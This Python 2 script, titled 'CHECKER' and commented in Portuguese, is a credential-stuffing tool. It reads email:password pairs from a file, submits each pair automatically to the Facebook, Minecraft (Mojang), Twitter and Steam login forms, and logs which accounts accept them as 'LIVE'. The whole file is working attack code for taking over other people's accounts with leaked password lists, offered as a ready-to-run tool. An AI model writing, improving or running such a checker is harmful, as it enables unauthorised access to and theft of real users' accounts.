'''
Linguagem = Python 2
Sistema = Linux or Mac

'''



#-------------------------Bibliotecas----------
import mechanize
from datetime import datetime
import os
import time

#-----------------------Cores-----------------------

cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
normal = '\033[0;0m'
purpleClaro= '\033[1;35m'
amarelo= '\033[1;33m'
ciano='\033[46m'
magenta='\033[45m'
normal = '\033[0;0m'
os.system('clear')

#BANER============================================================

BANNER_CHECKER=""" 
  /$$$$$$  /$$   /$$ /$$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$  | $$| $$_____/ /$$__  $$| $$  /$$/| $$_____/| $$__  $$
| $$  \__/| $$  | $$| $$      | $$  \__/| $$ /$$/ | $$      | $$  \ $$
| $$      | $$$$$$$$| $$$$$   | $$      | $$$$$/  | $$$$$   | $$$$$$$/
| $$      | $$__  $$| $$__/   | $$      | $$  $$  | $$__/   | $$__  $$
| $$    $$| $$  | $$| $$      | $$    $$| $$\  $$ | $$      | $$  \ $$
|  $$$$$$/| $$  | $$| $$$$$$$$|  $$$$$$/| $$ \  $$| $$$$$$$$| $$  | $$
 \______/ |__/  |__/|________/ \______/ |__/  \__/|________/|__/  |__/                                                                    
                        ___________________                                            
                       |Steam,facebook     |
                       |Twitter e Minecraft|
                       |___________________|                          
                       |		   |
                       |	           |
                       |by: Matheus Felipe |
                       |___________________|



                       """




print(BANNER_CHECKER)
nomearq=raw_input(vermelho+"Nome do arquivo: "+normal)

try:	
	arq = open('/home/matheus/Documents/Faculdade/python/'+str(nomearq), 'r')
except:
	nomearq=raw_input(vermelho+"Erro na abertura do arquivo digite outro nome de arquivo: "+normal) 
	arq = open('/home/matheus/Documents/Faculdade/python/'+str(nomearq), 'r')	

cont=int(0)
quantidade=int(input(vermelho+"Quantidade de logins a serem testados?: "+normal))
texto=arq.readlines()
verificador=int(0)

for linha in texto:
	
	arq2 = open('/home/matheus/Documents/Faculdade/python/testadas.txt', 'a')
	texto = []
	cont=cont+1
	inteira_linha=linha.split(':')
	email=inteira_linha[0]
	senha=inteira_linha[1]
	print(normal+"-------------------------------"+str(cont)+"-------------------------------"+cyanClaro)
		
	
	#--------------------------FACEBOOK--------------------
	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[("User-agent","Firefox")]
	br.open("https://www.facebook.com/login.php")
	br.select_form(nr=0)
	br.form['email'] = email
	br.form['pass'] = senha
	sub=br.submit()
	print("Testando->"+email+":"+senha)
		
	print ("Facebook-> "+sub.geturl())
	if (sub.geturl()=="https://www.facebook.com/?sk=welcome"):
		
		print(str(email)+"--"+str(senha)+ "LIVE")
		texto.append(str(email)+":"+str(senha)+ "LIVE\n")
		arq2.writelines(texto)
		verificador=verificador+1

	if(sub.geturl()=="https://www.facebook.com/checkpoint/?next"):

		print(str(email)+"--"+str(senha)+ " checkpoint")
		texto.append(str(email)+":"+str(senha)+" checkpoint\n")
		arq2.writelines(texto)
		verificador=verificador+1
		
		
	#--------------------------MINECRAFT--------------------

	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[("User-agent","Firefox")]
	br.open("https://account.mojang.com/login")
	br.select_form(nr=0)
	br.form['username'] = email
	br.form['password'] = senha
	sub=br.submit()
	print ("Minecraft-> "+sub.geturl())

	if(sub.geturl()=="https://account.mojang.com/me"):
		print(str(email)+"--"+str(senha)+ "LIVE-MINECRAFT")
		texto.append(str(email)+":"+str(senha)+" LIVE-MINECRAFT\n")
		arq2.writelines(texto)
		verificador=verificador+1

	if(sub.geturl()=="https://account.mojang.com/me/challenge"):
		print(str(email)+"--"+str(senha)+ "LIVE-MINECRAFT-verificacao")
		texto.append(str(email)+":"+str(senha)+" LIVE-MINECRAFT-verificacao\n")
		arq2.writelines(texto)
		verificador=verificador+1

	#--------------------------Twitter--------------------

	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[("User-agent","Firefox")]
	br.open("https://twitter.com/login")
	br.select_form(nr=1)
	br.form['session[username_or_email]'] = email
	br.form['session[password]'] = senha
	sub=br.submit()
	print ("Twitter-> "+sub.geturl())

	if (sub.geturl()=="https://twitter.com/"):
		print(str(email)+"--"+str(senha)+ "LIVE-Twitter")
		texto.append(str(email)+":"+str(senha)+" LIVE-Twitter\n")
		arq2.writelines(texto)
		verificador=verificador+1
	
	#--------------------------STEAM--------------------

	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[("User-agent","Firefox")]
	br.open("https://steamcommunity.com/login/home/?goto=")
	br.select_form(nr=0)
	br.form['username'] = email
	br.form['password'] = senha
	sub=br.submit()
	print ("Steam-> "+sub.geturl())
	

	if(sub.geturl()!="https://steamcommunity.com/login/home/?goto="):
		print(str(email)+"--"+str(senha)+ "LIVE-STEAM")
		texto.append(str(email)+":"+str(senha)+" LIVE-STEAM\n")
		arq2.writelines(texto)
		verificador=verificador+1		
	arq2.close()

	print(normal+"-------------------------------"+str(cont)+"-------------------------------")
	
	if(cont==quantidade):
		break
#---------------------------------Colocando data no arquivo e verificando se possui algum login realizado com sucesso-------
arq2 = open('/home/matheus/Documents/Faculdade/python/testadas.txt', 'a')
now = datetime.now()
if(verificador==0):
	arq2.writelines("Nenhum login feito com sucesso!\n")
else:
	arq2.writelines("Quantidade de logins certo: "+verificador+"\n")	






arq2.writelines("Data "+str(now.year)+"/"+str(now.month)+"/"+str(now.day)+" hora "+str(now.hour)+":"+str(now.minute)+":"+str(now.second)+"\n")
arq2.writelines("-------------------------------------------------------------------\n")

arq.close()
arq2.close()
os.system('clear')
print(vermelho+"Logins realizados:  "+normal)
os.system('cat testadas.txt')
time.sleep(1.5)
os.system('clear')







